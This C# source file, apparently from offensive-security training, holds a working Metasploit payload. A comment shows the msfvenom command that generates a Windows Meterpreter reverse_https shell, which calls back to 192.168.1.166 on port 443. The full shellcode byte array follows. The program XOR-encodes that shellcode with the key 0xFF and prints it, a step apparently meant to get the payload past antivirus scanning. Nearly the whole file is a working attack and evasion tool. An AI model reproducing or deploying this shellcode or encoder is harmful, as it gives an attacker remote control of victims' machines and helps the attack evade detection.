using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Runtime.InteropServices;


namespace ConsoleApp1
{
    class Program
    {
        static void Main(string[] args)
        {
            /*
            root@kali:/tmp# root@kali:/tmp# msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.166 LPORT=443 EXITFUNC=thread -f csharp > /tmp/met.cs
            [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
            [-] No arch selected, selecting arch: x86 from the payload
            No encoder specified, outputting raw payload
            Payload size: 601 bytes
            Final size of csharp file: 3077 bytes
            */
            byte[] buf = new byte[676] {
            0xfc,0xe8,0x8f,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,
            0x8b,0x52,0x0c,0x8b,0x52,0x14,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x8b,0x72,0x28,
            0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0x49,
            0x75,0xef,0x52,0x8b,0x52,0x10,0x57,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,
            0x85,0xc0,0x74,0x4c,0x01,0xd0,0x8b,0x58,0x20,0x8b,0x48,0x18,0x01,0xd3,0x50,
            0x85,0xc9,0x74,0x3c,0x31,0xff,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xc0,0xac,
            0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,
            0x75,0xe0,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,
            0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,
            0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xe9,0x80,0xff,0xff,0xff,0x5d,
            0x68,0x6e,0x65,0x74,0x00,0x68,0x77,0x69,0x6e,0x69,0x54,0x68,0x4c,0x77,0x26,
            0x07,0xff,0xd5,0x31,0xdb,0x53,0x53,0x53,0x53,0x53,0xe8,0x73,0x00,0x00,0x00,
            0x4d,0x6f,0x7a,0x69,0x6c,0x6c,0x61,0x2f,0x35,0x2e,0x30,0x20,0x28,0x57,0x69,
            0x6e,0x64,0x6f,0x77,0x73,0x20,0x4e,0x54,0x20,0x31,0x30,0x2e,0x30,0x3b,0x20,
            0x57,0x69,0x6e,0x36,0x34,0x3b,0x20,0x78,0x36,0x34,0x29,0x20,0x41,0x70,0x70,
            0x6c,0x65,0x57,0x65,0x62,0x4b,0x69,0x74,0x2f,0x35,0x33,0x37,0x2e,0x33,0x36,
            0x20,0x28,0x4b,0x48,0x54,0x4d,0x4c,0x2c,0x20,0x6c,0x69,0x6b,0x65,0x20,0x47,
            0x65,0x63,0x6b,0x6f,0x29,0x20,0x43,0x68,0x72,0x6f,0x6d,0x65,0x2f,0x39,0x38,
            0x2e,0x30,0x2e,0x34,0x37,0x35,0x38,0x2e,0x38,0x31,0x20,0x53,0x61,0x66,0x61,
            0x72,0x69,0x2f,0x35,0x33,0x37,0x2e,0x33,0x36,0x00,0x68,0x3a,0x56,0x79,0xa7,
            0xff,0xd5,0x53,0x53,0x6a,0x03,0x53,0x53,0x68,0xbb,0x01,0x00,0x00,0xe8,0x33,
            0x01,0x00,0x00,0x2f,0x6e,0x42,0x5f,0x4f,0x46,0x55,0x31,0x74,0x4b,0x6b,0x57,
            0x4a,0x57,0x59,0x68,0x59,0x36,0x2d,0x45,0x68,0x41,0x41,0x48,0x58,0x53,0x48,
            0x4f,0x5a,0x4f,0x6c,0x47,0x42,0x68,0x79,0x38,0x5f,0x35,0x76,0x53,0x6b,0x71,
            0x4e,0x5f,0x74,0x6a,0x72,0x52,0x5f,0x62,0x31,0x36,0x74,0x49,0x35,0x6b,0x7a,
            0x46,0x44,0x78,0x56,0x68,0x67,0x4f,0x5f,0x2d,0x4e,0x6e,0x44,0x67,0x4d,0x67,
            0x49,0x74,0x54,0x5a,0x53,0x35,0x6c,0x79,0x2d,0x72,0x6f,0x6f,0x35,0x34,0x43,
            0x75,0x38,0x59,0x73,0x57,0x61,0x6b,0x33,0x77,0x64,0x32,0x63,0x31,0x39,0x4e,
            0x7a,0x5a,0x7a,0x2d,0x37,0x4f,0x6f,0x6f,0x39,0x56,0x41,0x72,0x5a,0x54,0x5f,
            0x4b,0x4b,0x55,0x39,0x46,0x41,0x70,0x51,0x62,0x61,0x36,0x51,0x79,0x6d,0x46,
            0x43,0x6a,0x6d,0x5f,0x4e,0x41,0x78,0x6a,0x59,0x4e,0x33,0x6f,0x68,0x73,0x44,
            0x69,0x4d,0x58,0x42,0x57,0x6d,0x32,0x31,0x48,0x33,0x69,0x52,0x4b,0x78,0x5f,
            0x56,0x00,0x50,0x68,0x57,0x89,0x9f,0xc6,0xff,0xd5,0x89,0xc6,0x53,0x68,0x00,
            0x32,0xe8,0x84,0x53,0x53,0x53,0x57,0x53,0x56,0x68,0xeb,0x55,0x2e,0x3b,0xff,
            0xd5,0x96,0x6a,0x0a,0x5f,0x68,0x80,0x33,0x00,0x00,0x89,0xe0,0x6a,0x04,0x50,
            0x6a,0x1f,0x56,0x68,0x75,0x46,0x9e,0x86,0xff,0xd5,0x53,0x53,0x53,0x53,0x56,
            0x68,0x2d,0x06,0x18,0x7b,0xff,0xd5,0x85,0xc0,0x75,0x14,0x68,0x88,0x13,0x00,
            0x00,0x68,0x44,0xf0,0x35,0xe0,0xff,0xd5,0x4f,0x75,0xcd,0xe8,0x4a,0x00,0x00,
            0x00,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x68,0x00,0x00,0x40,0x00,0x53,0x68,
            0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x53,0x89,0xe7,0x57,0x68,0x00,0x20,
            0x00,0x00,0x53,0x56,0x68,0x12,0x96,0x89,0xe2,0xff,0xd5,0x85,0xc0,0x74,0xcf,
            0x8b,0x07,0x01,0xc3,0x85,0xc0,0x75,0xe5,0x58,0xc3,0x5f,0xe8,0x6b,0xff,0xff,
            0xff,0x31,0x39,0x32,0x2e,0x31,0x36,0x38,0x2e,0x31,0x2e,0x31,0x36,0x36,0x00,
            0xbb,0xe0,0x1d,0x2a,0x0a,0x68,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x3c,0x06,0x7c,
            0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x53,0xff,
            0xd5 };


            byte key = 0xFF;

            byte[] encoded = new byte[buf.Length];
            for (int i = 0; i < buf.Length; i++)
            {
                encoded[i] = (byte)(((uint)buf[i] ^ key) & 0xFF);
            }

            uint counter = 0;
            StringBuilder hex = new StringBuilder(encoded.Length * 2);
            foreach (byte b in encoded)
            {
                hex.AppendFormat("{0:D}, ", b);
                counter++;
                if(counter % 50 == 0)
                {
                    hex.AppendFormat("_{0}", Environment.NewLine);
                }
            }
            Console.WriteLine("The payload is: " + hex.ToString());

        }
    }
}
